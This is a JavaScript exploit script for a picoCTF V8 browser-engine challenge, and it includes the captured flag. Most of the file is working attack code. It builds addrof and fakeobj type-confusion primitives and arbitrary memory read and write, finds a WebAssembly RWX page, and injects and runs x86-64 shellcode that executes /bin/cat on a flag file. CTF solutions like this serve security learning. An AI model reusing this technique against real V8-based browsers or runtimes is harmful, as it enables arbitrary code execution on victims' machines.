/*
References:
https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/
http://www.jayconrod.com/posts/52/a-tour-of-v8--object-representation
https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

Apparantly the v8-optimized versions of the functions cause segfaults
So I had to duplicate those... on top of everything else going on
Yay

picoCTF{sh0u1d_hAv3_d0wnl0ad3d_m0r3_rAm_ 7d527e4f03815bf}
*/

var buf = new ArrayBuffer(8);
var floatBuf = new Float64Array(buf);
var intBuf = new BigUint64Array(buf);

function ftoi(val) {
	// console.log("ftoi " + val);
	floatBuf[0] = val;
	return intBuf[0];
}

function itof(val) {
	// console.log("itof " + val);
	intBuf[0] = BigInt(val);
	return floatBuf[0];
}

function least32(val) {
	// console.log("least32 " + val.toString(16));
	return val & 0xffffffffn;
}

function most32(val) {
	// console.log("most32 " + val.toString(16));
	return val / 0x100000000n;
}

function printData(arr, l, r) {
	for (let i = l; i <= r; i++) {
		console.log("arr[" + i + "] = " + "0x" + readOffset(arr, i).toString(16));
		// let curr = ftoi(arr[i>>1]);
		// console.log("arr[" + i + "] = " + "0x" + least32(curr).toString(16));
		// console.log("arr[" + (i+1) + "] = " + "0x" + most32(curr).toString(16));
	}
}

function readOffset(arr, i) {
	// console.log("read " + i);
	let curr = ftoi(arr[i>>1])
	if (i % 2 == 0) {
		return least32(curr);
	} else {
		return most32(curr);
	}
}

function writeOffset(arr, i, v) {
	let curr = readOffset(arr, i ^ 1);
	if (i % 2 == 0) {
		// Modify least 32 bits
		curr = curr * 0x100000000n;
		curr += BigInt(v);
		// console.log("least " + curr.toString(16));
	} else {
		// Modify most 32 bits
		curr = curr;
		curr += BigInt(v) * 0x100000000n;
		// console.log("most " + curr.toString(16));
	}
	arr[i>>1] = itof(curr);
}

function addrof(in_obj) {
	// Move target object to obj_arr
	obj_arr[0] = in_obj;
	// Overwrite with a float map
	writeOffset(float_arr, 38, float_arr_map);
	// Read the address
	let addr = readOffset(obj_arr, 0);
	// Revert to object map
	writeOffset(float_arr, 38, obj_arr_map);
	// Return address
	return addr;
}

function fakeobj(addr) {
	// Move target address to mutate_arr
	mutate_arr[0] = itof(addr);
	// Overwrite with an object map
	writeOffset(float_arr, 86, obj_arr_map);
	// Get the "fake" object
	let fake = mutate_arr[0];
	// Revert to float map
	writeOffset(float_arr, 86, float_arr_map);
	// Return the object
	return fake;
}

function readOffset2(arr, i) {
	// console.log("read " + i);
	let curr = ftoi(arr[i>>1])
	if (i % 2 == 0) {
		return least32(curr);
	} else {
		return most32(curr);
	}
}

function writeOffset2(arr, i, v) {
	let curr = readOffset2(arr, i ^ 1);
	if (i % 2 == 0) {
		// Modify least 32 bits
		curr = curr * 0x100000000n;
		curr += BigInt(v);
		// console.log("least " + curr.toString(16));
	} else {
		// Modify most 32 bits
		curr = curr;
		curr += BigInt(v) * 0x100000000n;
		// console.log("most " + curr.toString(16));
	}
	arr[i>>1] = itof(curr);
}

function addrof2(in_obj) {
	// Move target object to obj_arr
	obj_arr[0] = in_obj;
	// Overwrite with a float map
	writeOffset2(float_arr, 38, float_arr_map);
	// Read the address
	let addr = readOffset2(obj_arr, 0);
	// Revert to object map
	writeOffset2(float_arr, 38, obj_arr_map);
	// Return address
	return addr;
}

function fakeobj2(addr) {
	// Move target address to mutate_arr
	mutate_arr[0] = itof(addr);
	// Overwrite with an object map
	writeOffset2(float_arr, 86, obj_arr_map);
	// Get the "fake" object
	let fake = mutate_arr[0];
	// Revert to float map
	writeOffset2(float_arr, 86, float_arr_map);
	// Return the object
	return fake;
}

function arbRead(addr) {
	console.log("read " + addr.toString(16));
	addr = BigInt(addr);
	// v8 pointers are odd
	if (addr % 2n == 0n) addr += 1n;
	// "Create" a fake object with map of arb_rw_arr
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	// Write the target address to the elments pointer of the "object"
	writeOffset(arb_rw_arr, 2, addr - 0x8n);
	// Read the first element (the target address)
	return readOffset(fake, 0);
}

function arbWrite(addr, v) {
	console.log("write " + addr.toString(16) + " " + v.toString(16));
	addr = BigInt(addr);
	// v8 pointers are odd
	if (addr % 2n == 0n) addr += 1n;
	// "Create" a fake object with map of arb_rw_arr
	let fake = fakeobj2(addrof2(arb_rw_arr) - 0x20n);
	// Write the target address to the elments pointer of the "object"
	writeOffset2(arb_rw_arr, 2, addr - 0x8n);
	// Write to the first element (the target address)
	return writeOffset2(fake, 0, v);
}

// Below shellcode is taken from Kit Engine (1st challenge involving v8)
var shellcode = [0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xDB, 0x53, 0x48, 0xB9, 0x2F, 0x64, 0x65, 0x76, 0x2F, 0x74, 0x74, 0x79, 0x51, 0x54, 0x5F, 0x48, 0xBE, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31, 0xD2, 0x52, 0x48, 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x63, 0x61, 0x74, 0x57, 0x54, 0x5F, 0x52, 0x48, 0xBB, 0x66, 0x6C, 0x61, 0x67, 0x2E, 0x74, 0x78, 0x74, 0x53, 0x48, 0xBB, 0x61, 0x72, 0x67, 0x31, 0x00, 0x00, 0x00, 0x00, 0x53, 0x54, 0x59, 0x48, 0x83, 0xE9, 0x18, 0x48, 0x89, 0xCE, 0x52, 0x48, 0x83, 0xC1, 0x20, 0x51, 0x48, 0x83, 0xE9, 0x08, 0x51, 0x0F, 0x05, 0xC9, 0xC3];

function writeShellcode(addr, v) {
	buf = new ArrayBuffer(512);
	dataview = new DataView(buf);
	let buf_addr = addrof(buf);
	console.log("buf: " + buf_addr.toString(16));
	let backing_store_addr = buf_addr + 0x18n;
	arbWrite(backing_store_addr, most32(addr));
	arbWrite(backing_store_addr - 4n, least32(addr));
	console.log("writes done");
	for (let i = 0; i < shellcode.length; i++) {
		dataview.setUint8(i, shellcode[i]);
	}
}

var codefunc = function() {
	return 1;
}

class ExploitObj {
	constructor() {
		this.float_arr = [1.1, 2.2];
		this.obj_arr = [codefunc];
		this.arb_rw = new ArrayBuffer(4);
		this.mutate_arr = [3.3, 4.4];
	}
};

function setHorsepower(val) {
	print("PLEASE SET HORSEPOWER " + val + " MANUALLY");
	%DebugPrint(float_arr);
	Breakpoint();
	%DebugPrint(float_arr);
}

function initExp() {
	// Create object so memory offsets are fixed
	// Length is stored at the 4th 32bit location of float object (obj_loc+0xc), divide by 2 to get actual length
	tempobj = new ExploitObj();
	float_arr = tempobj.float_arr;
	// while (float_arr.length < 0x1337) float_arr.push(3.3);
	setHorsepower(200);
	obj_arr = tempobj.obj_arr;
	arb_rw = tempobj.arb_rw;
	mutate_arr = tempobj.mutate_arr;

	// Get maps
	float_arr_map = readOffset(float_arr, 4);
	obj_arr_map = readOffset(float_arr, 38);

	// Setup arbitrary read and write primitives
	arb_rw_arr = [1.1, 1.2, 1.3, 1.4];
	writeOffset(arb_rw_arr, 0, float_arr_map);

	// console.log("Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));
	// console.log("Controlled object array: 0x" + addrof(obj_arr).toString(16));
	// console.log("Controlled mutate array: 0x" + addrof(mutate_arr).toString(16));
}

function exploit() {
	codefunc();
	initExp();

	// js_function = addrof(codefunc);
	// console.log("js_function: 0x" + js_function.toString(16));

	// code_addr = arbRead(js_function + 56n);
	// console.log("code_addr: 0x" + code_addr.toString(16));

	// shellcode_addr = code_addr + 128n;
	// console.log("shellcode_addr: 0x" + shellcode_addr.toString(16));

	// https://wasdk.github.io/WasmFiddle/
	wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	wasm_mod = new WebAssembly.Module(wasm_code);
	wasm_instance = new WebAssembly.Instance(wasm_mod);
	f = wasm_instance.exports.main;

	// Find address (got from brute-forcing in gdb)
	wasm_addr = addrof(wasm_instance);
	rwx_page_addr = arbRead(wasm_addr+0x6bn) * 0x100000000n + arbRead(wasm_addr+0x67n);
	console.log("wasm_addr: 0x" + wasm_addr.toString(16));
	// writeOffset(float_arr, 86, 0x31313131);
	console.log("rwx_page_addr: 0x" + rwx_page_addr.toString(16));

	writeShellcode(rwx_page_addr);
	console.log("Shellcode written");
	f();

	// Overwrite obj_arr's map to float_arr_map
	// %DebugPrint(float_arr);
	// %DebugPrint(obj_arr);
	// writeOffset(float_arr, 0, 0x14141414);
	// writeOffset(float_arr, 1, 0x15151515);
	// writeOffset(float_arr, 38, float_arr_map)
	// Breakpoint();

	// writeOffset32(obj_arr, 4, float_arr_map);
	// writeOffset32(obj_arr, 1, float_arr_map);
	// Breakpoint();
	// console.log("0x" + ftoi(obj_arr[1]).toString(16));

	// printData(obj_arr, 0, 1);
	// %DebugPrint(float_arr);
	// %DebugPrint(obj);
	// printData(float_arr, 0, 20);
	// printData(obj_arr, 0, 20);

	// %DebugPrint(tempobj);
	// %DebugPrint(code);
	// %DebugPrint(obj_arr);
	// console.log("float_arr_map: 0x" + float_arr_map.toString(16));
}

exploit();
// Breakpoint();
